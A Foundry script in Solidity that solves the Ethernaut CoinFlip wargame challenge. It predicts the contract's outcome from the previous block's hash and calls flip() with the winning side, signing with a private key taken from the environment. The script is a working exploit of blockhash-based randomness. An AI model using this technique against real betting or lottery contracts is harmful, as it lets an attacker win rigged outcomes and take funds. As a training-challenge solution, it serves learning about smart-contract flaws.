// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

/// @author agadzhalov
/// @title Solution to CoinFlip Ethernaut challange
/// @notice Solution: Everything on the blockchain is deterministic. Run this method 10 times and you are the winner
contract CoinFlipScript is Script {
    /// @notice The deployed CoinFlip contract address.
    CoinFlip public coinFlip = CoinFlip(0xb88304f16C30B1cfBA8e481bdE40EED4999789Cd);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // 1. Get the last block's hash value to predict the coin flip outcome
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // 2. Predefined factor used in the CoinFlip contract to determine the coin flip outcome
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        // 3. Calculate the predicted coin flip outcome: `true` for heads, `false` for tails
        uint256 coinFlipp = blockValue / FACTOR;
        bool side = coinFlipp == 1 ? true : false;

        // 4. Execute the coin flip with the predicted side
        coinFlip.flip(side);

        // 5. Log the current number of consecutive wins
        console.log("Consecutive wins:", coinFlip.consecutiveWins());

        vm.stopBroadcast();
    }
}
